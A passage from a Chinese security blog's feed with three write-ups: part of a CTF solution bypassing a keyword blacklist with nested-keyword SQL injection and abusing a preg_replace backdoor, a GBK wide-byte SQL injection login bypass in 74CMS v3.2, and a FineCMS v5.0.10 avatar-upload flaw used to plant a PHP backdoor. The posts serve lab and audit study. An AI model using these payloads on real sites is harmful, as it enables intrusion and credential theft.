php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">if</span>($_SERVER[<span class="string">'HTTP_USER_AGENT'</span>]!=<span class="string">"Xlcteam Browser"</span>)&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">'万恶滴黑阔，本功能只有用本公司开发的浏览器才可以用喔~'</span>;</div><div class="line">    <span class="keyword">exit</span>();</div><div class="line">&#125;</div><div class="line">$id=$_POST[<span class="string">'soid'</span>];</div><div class="line"><span class="keyword">include</span> <span class="string">'config.php'</span>;</div><div class="line"><span class="keyword">include</span> <span class="string">'antiinject.php'</span>;</div><div class="line"><span class="keyword">include</span> <span class="string">'antixss.php'</span>;</div><div class="line">$id=antiinject($id);</div><div class="line">$con = mysql_connect($db_address,$db_user,$db_pass) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"不能连接到数据库！"</span>.mysql_error());</div><div class="line">mysql_select_db($db_name,$con);</div><div class="line">$id=mysql_real_escape_string($id);</div><div class="line">$result=mysql_query(<span class="string">"SELECT * FROM `message` WHERE display=1 AND id=$id"</span>);</div><div class="line">$rs=mysql_fetch_array($result);</div><div class="line"><span class="keyword">echo</span> htmlspecialchars($rs[<span class="string">'nice'</span>]).<span class="string">':&amp;lt;br /&amp;gt;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;'</span>.antixss($rs[<span class="string">'say'</span>]).<span class="string">'&amp;lt;br /&amp;gt;'</span>;</div><div class="line">mysql_free_result($result);</div><div class="line">mysql_free_result($file);</div><div class="line">mysql_close($con);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>这儿的<code>$id</code>参数可能存在注入，通过源码发现还存在<code>antiinject.php</code>和<code>antixss.php</code>。继续读其他文件的源码。</p><p><code>antiinject.php</code>源码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> </div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">antiinject</span><span class="params">($content)</span></span>&#123; </div><div class="line">    $keyword=<span class="keyword">array</span>(<span class="string">"select"</span>,<span class="string">"union"</span>,<span class="string">"and"</span>,<span class="string">"from"</span>,<span class="string">' '</span>,<span class="string">"'"</span>,<span class="string">";"</span>,<span class="string">'"'</span>,<span class="string">"char"</span>,<span class="string">"or"</span>,<span class="string">"count"</span>,<span class="string">"master"</span>,<span class="string">"name"</span>,<span class="string">"pass"</span>,<span class="string">"admin"</span>,<span class="string">"+"</span>,<span class="string">"-"</span>,<span class="string">"order"</span>,<span class="string">"="</span>);</div><div class="line">     $info=strtolower($content); </div><div class="line">     <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;=count($keyword);$i++)&#123; </div><div class="line">        $info=str_replace($keyword[$i], <span class="string">''</span>,$info); </div><div class="line">    &#125; <span class="keyword">return</span> $info; </div><div class="line">&#125; </div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>这是一个基于黑名单的过滤函数，将所有的关键字转换位空。我们马上可以想到使用关键字嵌套的方式可以绕过。在<code>so.php</code>中使用了<code>mysql_real_escape_string</code>。</p><p>它只转义 <strong>\x00、\n、\r、\、’、”、\x1a</strong>字符，这人使用的整型注入。</p><h3 id="0x03-利用"><a href="#0x03-利用" class="headerlink" title="0x03 利用"></a>0x03 利用</h3><p>根据之前信息收集，我们之后数据库中存在<code>admin</code>数据表。所以我们需要将<code>admin</code>表中的记录读取出来。</p><p>我们先猜解了message字段有4个，这个没有难度。就不给语句了。</p><p>根据之前的信息，我们直接可以查询该密码，</p><p>payload:<code>1/**/anANDd/**/1&gt;3/**/unUNIONion/**/selSELECTect/**/1,usernaNAMEme,userpaPASSss,4/**/frFROMom/**/admADMINin</code></p><img src="/2017/09/11/南邮CTF综合题2WriteUp/3.png" alt="ByPupil" title="ByPupil"><p>根据我们之前的信息收集，我们知道这是每一个字符的ASCII码，</p><img src="/2017/09/11/南邮CTF综合题2WriteUp/4.png" alt="ByPupil" title="ByPupil"><p>解码后的密码为：<code>fuckruntu</code>，登录后台，现在已经存在小马了。</p><img src="/2017/09/11/南邮CTF综合题2WriteUp/5.png" alt="ByPupil" title="ByPupil"><p>要如何才能连上呢，想到了<code>about.php</code>这是一个可以读取文件的页面。</p><img src="/2017/09/11/南邮CTF综合题2WriteUp/6.png" alt="ByPupil" title="ByPupil"><p>一看这个木马是一个回调后门，这儿主要利用了<code>preg_replace</code>函数的e模式。在e模式下，第二个参数会产生命令执行。</p><p>我们可以构造语句进行目录枚举出来了：</p><p><code>www=preg_replace&amp;wtf=var_dump(scandir(&#39;.&#39;))</code></p><img src="/2017/09/11/南邮CTF综合题2WriteUp/7.png" alt="ByPupil" title="ByPupil"><p>直接读取<code>恭喜你获得flag2.txt</code>就可以获取到flag了。</p><h3 id="0x04-搞事"><a href="#0x04-搞事" class="headerlink" title="0x04 搞事"></a>0x04 搞事</h3><p>突然想到，我要把这道题目<code>1:1</code>进行导出来。现在还不知道数据库是怎么设计的。还有一个config.php没有读出来呢。构造语句：</p><p><code>www=preg_replace&amp;wtf=print_r(file_get_contents(&#39;config.php&#39;))</code></p><img src="/2017/09/11/南邮CTF综合题2WriteUp/8.png" alt="ByPupil" title="ByPupil"><p>亲自测试了，数据库是可以连上的。当然作为白帽的我们不要搞破坏，从中学习到技巧最重要。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h3&gt;&lt;p&gt;由于这道题目能够读取源码，很开的我将它收入到了我的&lt;a href=&quot;https://github.c
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://bypupil.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>74CMS v3.2 - 宽字节注入</title>
    <link href="https://bypupil.github.io/2017/08/25/74CMS-v3-2-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/"/>
    <id>https://bypupil.github.io/2017/08/25/74CMS-v3-2-宽字节注入/</id>
    <published>2017-08-24T16:11:07.000Z</published>
    <updated>2017-09-24T09:25:12.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>这个<code>74CMS</code>也是靶场之一，其实本这来这儿是做了过滤的。因为需求有一个注入，机智的我直接改了编码。让这儿产生一个宽字节注入。</p><h3 id="0x01-漏洞解析"><a href="#0x01-漏洞解析" class="headerlink" title="0x01 漏洞解析"></a>0x01 漏洞解析</h3><p>产生此次注入漏洞的关键一点是：使用了GBK的编码。</p><img src="/2017/08/25/74CMS-v3-2-宽字节注入/1.png" alt="ByPupil" title="ByPupil"><img src="/2017/08/25/74CMS-v3-2-宽字节注入/2.png" alt="ByPupil" title="ByPupil"><p><strong>请求方式：</strong><code>POST</code></p><p><strong>触发点：</strong><code>admin_login.php?act=do_login</code></p><p><strong>Payload：</strong><code>admin_name=123%df&#39; or 1=1%23&amp;admin_pwd=1</code></p><p><strong>详情：</strong></p><p>通过触发点，我们定位到了<code>admin_login.php</code>这个文件。<code>act=do_login</code>在页面的第42行。在认识到前提这是一个<strong>宽字节的SQL注入</strong>，所以在整个回溯过程中必定是可以找到<code>magic_quotes_gpc</code>，<code>addslashes</code>进行转义，会在单引号之前添加<code>\</code>进行转义。在审计过程中，确实发现在文件<code>admin_common.inc.php</code>中有着全局过滤。</p><img src="/2017/08/25/74CMS-v3-2-宽字节注入/3.png" alt="ByPupil" title="ByPupil"><p>这儿首先判断是否开启了<code>get_magic_quotes_gpc</code>，如果没有开启<code>get_magic_quotes_gpc</code>，那么会调用<code>admin_addslashes_deep</code>函数进行过滤。回溯<code>admin_addslashes_deep</code>发现函数位于<code>admin_common.fun.php</code>的16行。</p><img src="/2017/08/25/74CMS-v3-2-宽字节注入/4.png" alt="ByPupil" title="ByPupil"><p>在不为空的情况下，将其所有值使用<code>addslashes</code>函数进行过滤。</p><p>如果我们传入<code>admin_name=123%df&#39;</code>时，就能够将<code>&#39;</code>进行逃逸出来。接着继续跟踪代码，在<code>admin_login.php</code>的73行开始进行账号密码验证了，此处调用了<code>check_admin</code>函数进行检测。<code>check_admin</code>函数的详情在<code>admin_common.fun.php</code>中。</p><img src="/2017/08/25/74CMS-v3-2-宽字节注入/5.png" alt="ByPupil" title="ByPupil"><p>核心的sql语句在这儿开始出现了：</p><p><code>SELECT COUNT(*) AS num FROM admin WHERE admin_name=&#39;$name&#39; and pwd=&#39;$pass&#39;</code></p><p>我们这儿可以传入<code>123%df&#39;%23</code>，那么整条sql语句就会改变成如下：</p><p><code>SELECT COUNT(*) AS num FROM admin WHERE admin_name=&#39;123運&#39;#&#39; and pwd=&#39;$pass&#39;</code></p><p>使用payload：<code>admin_name=123%df&#39; or 1=1 %23</code></p><p><code>SELECT COUNT(*) AS num FROM admin WHERE admin_name=&#39;123運&#39; or 1=1 #&#39; and pwd=&#39;$pass&#39;</code></p><h3 id="0x02-总结"><a href="#0x02-总结" class="headerlink" title="0x02 总结"></a>0x02 总结</h3><p>原本程序其实已经做了相对多的过滤规则了，然后因为设计靶机的时将连接数据库的字符集修改成了gbk，导致了宽字节注入。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h3&gt;&lt;p&gt;这个&lt;code&gt;74CMS&lt;/code&gt;也是靶场之一，其实本这来这儿是做了过滤的。因为需求有一个注入
      
    
    </summary>
    
    
      <category term="code audit" scheme="https://bypupil.github.io/tags/code-audit/"/>
    
  </entry>
  
  <entry>
    <title>FineCMS v5.0.10任意文件上传</title>
    <link href="https://bypupil.github.io/2017/08/23/FineCMS-v5-0-10%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    <id>https://bypupil.github.io/2017/08/23/FineCMS-v5-0-10任意文件上传/</id>
    <published>2017-08-23T13:39:53.000Z</published>
    <updated>2017-09-24T09:27:11.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>最近设计靶场环境，找了一个<code>FineCMS</code>放了上去，网上搜索该CMS漏洞，找到了任意文件上传。只有利用的技巧，却没有找到实际发生任意文件上传的触发点以及不安全的代码。</p><h3 id="0x01-漏洞解析"><a href="#0x01-漏洞解析" class="headerlink" title="0x01 漏洞解析"></a>0x01 漏洞解析</h3><p><strong>请求方式：</strong><code>POST</code></p><p><strong>触发点：</strong><code>/index.php?s=member&amp;c=account&amp;m=upload&amp;iajax=1</code></p><p><strong>利用：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">注册用户</div><div class="line">登录用户</div><div class="line">生成图片木马</div><div class="line">在头像上传点上传图片木马</div><div class="line">修改tx参数中的data%3Aimage%2F后的值改为php</div><div class="line">抓包查看用户的id</div><div class="line">连接/uploadfile/member/id/0x0.php该后门文件</div></pre></td></tr></table></figure><p><strong>详情：</strong></p><p>文件上传漏洞有三大必要条件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">文件可上传</div><div class="line">上传后路径可知</div><div class="line">文件可执行</div></pre></td></tr></table></figure><p>完成以上三点，整个文件上传攻击就可以完成。</p><p>根据文件上传的url，可以定位到的文件及其代码位置为：<code>/finecms/dayrui/controllers/Account.php</code>中的177行的<code>upload</code>函数。</p><img src="/2017/08/23/FineCMS-v5-0-10任意文件上传/1.png" alt="ByPupil" title="ByPupil"><p>观察了整段文件上传的代码，我们唯一发现代码186行存在一个正则表达式的图片限制：<code>/^(data:\s*image\/(\w+);base64,)/</code>，在这个正则表达式中的(\w+)还是可控的，且在187行中该参数作为了后缀。这也就是我们可以通过修改<code>data:image/(可控);base64,</code>中可控的部分，且该部分就是文件的后缀，所以在此上传一个图片木马，然后通过burp抓包将其后缀改成php即可。审计源码之后，我们发现另一个问题，所有的用户的头像的名称都是其uid号，且它们的目录位于：<code>uploadfile/member/$uid/0x0.php</code>中。可以使用<code>system()</code>方式传递参数检测是可以进行解析的。</p><img src="/2017/08/23/FineCMS-v5-0-10任意文件上传/2.png" alt="ByPupil" title="ByPupil"><h3 id="0x02-总结"><a href="#0x02-总结" class="headerlink" title="0x02 总结"></a>0x02 总结</h3><p>整个分析过程主要基于文件上传三个必要条件进行，首先图片通过<strong>Data URL scheme</strong>的方式将图片进行base64的方式编码上传，然后定位函数发现整个过程中，其实并没有一次限制及过滤规则，通过修改<code>data:image/jpeg;base64,</code>中的格式部分直接就可以上传了。第二，因为文件路径是写死的所以很容易找到图片路径。第三，因为图片被改写成了php后缀，所以文件必定是可执行的。满足了三个必要条件，最终形成了文件上传漏洞。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h3&gt;&lt;p&gt;最近设计靶场环境，找了一个&lt;code&gt;FineCMS&lt;/code&gt;放了上去，网上搜索该CMS漏洞，找
      
    
    </summary>
    
    
      <category term="code audit" scheme="https://bypupil.github.io/tags/code-audit/"/>
    
  </entry>
  
</feed>
